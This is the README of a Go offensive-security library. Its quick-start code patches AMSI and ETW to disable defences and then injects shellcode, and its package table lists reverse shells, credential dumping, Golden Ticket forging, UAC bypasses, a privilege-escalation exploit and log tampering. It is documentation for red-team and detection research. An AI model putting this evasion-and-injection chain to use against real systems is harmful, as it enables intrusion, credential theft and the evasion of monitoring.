# maldev

> Modular Go library for offensive-security research. 180 packages cover the
> ATT&CK techniques an operator, a researcher, or a detection engineer needs
> to reproduce, study, or counter — wired together by a single
> `*wsyscall.Caller` so syscall stealth, evasion, and injection compose
> uniformly.

[![Go Reference](https://pkg.go.dev/badge/github.com/oioio-space/maldev.svg)](https://pkg.go.dev/github.com/oioio-space/maldev)
[![Go Report Card](https://goreportcard.com/badge/github.com/oioio-space/maldev)](https://goreportcard.com/report/github.com/oioio-space/maldev)
[![License: research](https://img.shields.io/badge/license-research--only-blue)](LICENSE)

## What is this?

A single Go module collecting **the full chain** of malware-engineering
primitives — not isolated demos, but interoperable packages that share one
syscall caller, one evasion model, and one MITRE mapping. Pure Go, no CGO,
cross-compilable.

Three audiences, three reading paths:

- **Operators (red team)** want chains that run in production: payload
  encryption → AMSI/ETW patch → unhook → inject → sleepmask → cleanup.
- **Researchers** want to read 200-line implementations of a technique with
  paper references, MITRE/D3FEND tags, and Windows version notes.
- **Detection engineers** want the artifact list per technique: syscalls,
  ETW providers, registry keys, event-log gaps.

> [!IMPORTANT]
> For authorised security research, red-team operations, and penetration
> testing only. See [LICENSE](LICENSE).

## Install

```bash
go get github.com/oioio-space/maldev@latest
```

## Quick start

```go
import (
    "github.com/oioio-space/maldev/evasion"
    "github.com/oioio-space/maldev/evasion/amsi"
    "github.com/oioio-space/maldev/evasion/etw"
    "github.com/oioio-space/maldev/inject"
    wsyscall "github.com/oioio-space/maldev/win/syscall"
)

// 1. Stealthy syscall caller (indirect + Hash/Hell's gate chain).
caller := wsyscall.New(
    wsyscall.MethodIndirect,
    wsyscall.Chain(wsyscall.NewHashGate(), wsyscall.NewHellsGate()),
)

// 2. Disable in-process defences.
evasion.ApplyAll([]evasion.Technique{
    amsi.ScanBufferPatch(),
    etw.All(),
}, caller)

// 3. Inject shellcode via CreateThread.
injector, _ := inject.NewWindowsInjector(&inject.WindowsConfig{
    Config:        inject.Config{Method: inject.MethodCreateThread},
    SyscallMethod: wsyscall.MethodIndirect,
})
injector.Inject(shellcode)
```

## Where to start

**Choose your role:**

- 🟥 **Operator (red team)** → [docs/by-role/operator.md](docs/by-role/operator.md)
- 🔬 **Researcher (R&D)** → [docs/by-role/researcher.md](docs/by-role/researcher.md)
- 🟦 **Detection engineer (blue team)** → [docs/by-role/detection-eng.md](docs/by-role/detection-eng.md)

**Or browse:**

- 🗺️ [Documentation index](docs/index.md) — every package, by area + by MITRE ID
- 🎯 [MITRE ATT&CK / D3FEND map](docs/mitre.md)
- 📚 [`pkg.go.dev` API reference](https://pkg.go.dev/github.com/oioio-space/maldev)

## Package map

> A short, hand-curated overview. The full inventory of every package lives in
> [docs/index.md](docs/index.md).

| Area | Docs | Sub-packages |
|---|---|---|
| **Syscalls** | [techniques/syscalls/](docs/techniques/syscalls/README.md) | `win/syscall`, `win/api`, `win/ntapi` — 4 calling methods × 5 SSN resolvers; the `*Caller` plugged everywhere |
| **Evasion** | [techniques/evasion/](docs/techniques/evasion/README.md) | `amsi`, `etw`, `unhook`, `sleepmask`, `callstack`, `acg`, `blockdlls`, `cet`, `hook`, `kcallback`, `preset`, `stealthopen` |
| **Injection** | [techniques/injection/](docs/techniques/injection/README.md) | 15+ methods — CreateThread, APC family, ThreadHijack, SectionMap, KernelCallback, PhantomDLL, ModuleStomp, ThreadPool, EarlyBird, … |
| **PE** | [techniques/pe/](docs/techniques/pe/README.md) | `srdi`, `morph`, `strip`, `masquerade`, `cert`, `parse`, `imports` — PE-to-shellcode (Donut), strip Go pclntab, masquerade as cmd.exe, cert clone |
| **In-process runtimes** | [techniques/runtime/](docs/techniques/runtime/README.md) | `bof`, `clr` — BOF / COFF loader; in-process .NET CLR hosting |
| **C2** | [techniques/c2/](docs/techniques/c2/README.md) | `shell`, `transport`, `transport/namedpipe`, `meterpreter`, `multicat`, `cert` — reverse shell + reconnect, JA3 fingerprinting, Meterpreter staging, multi-session listener |
| **Persistence** | [techniques/persistence/](docs/techniques/persistence/README.md) | `registry`, `startup`, `scheduler`, `service`, `lnk`, `account` — Run/RunOnce, scheduled tasks via COM, service install, local account creation |
| **Credentials** | [techniques/credentials/](docs/techniques/credentials/README.md) | `lsassdump`, `sekurlsa`, `samdump`, `goldenticket` — LSASS dump, MSV/Kerberos parser, SAM offline parse, Golden Ticket forge |
| **Recon** | [techniques/recon/](docs/techniques/recon/README.md) | `antidebug`, `antivm`, `sandbox`, `timing`, `hwbp`, `dllhijack`, `drive`, `folder`, `network` — environment checks, HW breakpoint inspection, DLL-search-order discovery |
| **Process tamper** | [techniques/process/](docs/techniques/process/README.md) | `enum`, `session`, `tamper/herpaderping`, `tamper/fakecmd`, `tamper/hideprocess`, `tamper/phant0m` — herpaderping/ghosting, PEB CommandLine spoof, hide PID, kill EventLog |
| **Privesc** | [docs/privilege.md](docs/privilege.md) | `uac`, `cve202430088` — 4 UAC bypasses, CVE-2024-30088 LPE |
| **Cleanup** | [techniques/cleanup/](docs/techniques/cleanup/README.md) | `selfdelete`, `memory`, `timestomp`, `wipe`, `ads`, `bsod`, `service` — self-delete, secure wipe, timestomp, ADS streams, controlled BSOD |
| **Collection** | [techniques/collection/](docs/techniques/collection/README.md) | `keylog`, `clipboard`, `screenshot` — keyboard hook, clipboard watch, multi-monitor screenshot |
| **Kernel BYOVD** | [techniques/kernel/](docs/techniques/kernel/README.md) | `kernel/driver`, `kernel/driver/rtcore64` — RTCore64 (CVE-2019-16098) read/write primitives |
| **Tokens & Privileges** | [techniques/tokens/](docs/techniques/tokens/README.md) | `win/token`, `win/privilege`, `win/impersonate` — token theft, impersonation, privilege escalation |
| **Crypto / encode / hash** | [techniques/crypto/](docs/techniques/crypto/README.md) · [techniques/encode/](docs/techniques/encode/README.md) | `crypto`, `encode`, `hash` — AES-GCM, ChaCha20, XTEA, S-Box · Base64, UTF-16LE · ROR13, ssdeep, TLSH |

## Build

```bash
go build $(go list ./...)         # local build
go test  $(go list ./...)         # tests (host-only)
GOOS=linux go build $(go list ./...)
```

Requires **Go 1.21+**. No CGO. Tests with `MALDEV_INTRUSIVE=1
MALDEV_MANUAL=1` belong in a VM — see
[docs/by-role/researcher.md](docs/by-role/researcher.md#vm-testing).

## Acknowledgments

- [D3Ext/maldev](https://github.com/D3Ext/maldev) — original inspiration.
- [Binject/go-donut](https://github.com/Binject/go-donut) +
  [TheWover/donut](https://github.com/TheWover/donut) — PE-to-shellcode
  (`pe/srdi`).
- [microsoft/go-winio](https://github.com/microsoft/go-winio) — ADS concepts
  (`cleanup/ads`).

## License

Research-only. See [LICENSE](LICENSE) for the full scope (red-team
operations, technique research, EDR/AV evasion study, defensive RE
training). **Not** for unauthorised production targeting,
mass-distribution, or destructive operations against infrastructure not
under your control.
